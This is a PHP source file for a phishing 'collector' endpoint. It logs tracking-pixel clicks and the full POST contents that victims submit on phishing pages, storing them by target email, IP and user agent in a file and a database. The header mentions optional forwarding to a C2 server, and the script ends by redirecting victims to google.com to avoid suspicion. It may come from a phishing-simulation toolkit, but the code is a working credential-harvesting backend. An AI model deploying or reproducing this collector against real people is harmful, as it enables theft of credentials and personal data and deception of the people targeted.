<?php
/**
 * COSMIC PHISHING COLLECTOR – PROFESSIONAL GRADE
 * Handles GET (tracking pixels) and POST (form submissions) from phishing pages.
 * Logs to database, file, and optionally forwards to C2.
 */
require_once __DIR__ . '/../includes/security_functions.php';
require_once __DIR__ . '/../../system/modules/phishing/PhishingCampaign.php';

// Initialize logging
$logDir = __DIR__ . '/logs';
if (!is_dir($logDir)) mkdir($logDir, 0755, true);
$logFile = $logDir . '/collector.log';

// Capture request data
$campaignId = isset($_REQUEST['campaign']) ? (int)$_REQUEST['campaign'] : null;
$targetEmail = $_REQUEST['email'] ?? null;
$page = $_REQUEST['page'] ?? 'unknown';
$ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$timestamp = time();

// Log raw request to file
$logEntry = date('Y-m-d H:i:s') . " | campaign=$campaignId | email=$targetEmail | page=$page | ip=$ip | ua=$ua | post=" . json_encode($_POST) . " | get=" . json_encode($_GET) . "\n";
file_put_contents($logFile, $logEntry, FILE_APPEND);

// If campaign ID is present, store in database
if ($campaignId) {
    $phish = new PhishingCampaign();
    
    // If there's a target email, try to associate with target
    if ($targetEmail && filter_var($targetEmail, FILTER_VALIDATE_EMAIL)) {
        // Log click
        $phish->logClick($campaignId, $targetEmail, $ip, $ua);
        
        // If POST data exists, log submission
        if (!empty($_POST)) {
            $phish->logSubmission($campaignId, $targetEmail, $_POST);
        }
    } else {
        // No email – maybe a tracking pixel? Still log as anonymous click.
        // We can create a dummy email or just log to file.
        $phish->logClick($campaignId, 'anonymous@collector.local', $ip, $ua);
        if (!empty($_POST)) {
            $phish->logSubmission($campaignId, 'anonymous@collector.local', $_POST);
        }
    }
}

// Log to security log
log_security_event('PHISHING_COLLECT', [
    'campaign' => $campaignId,
    'email' => $targetEmail,
    'page' => $page,
    'ip' => $ip,
    'has_post' => !empty($_POST)
]);

// Redirect to a benign site to avoid suspicion
header('Location: https://www.google.com');
exit;
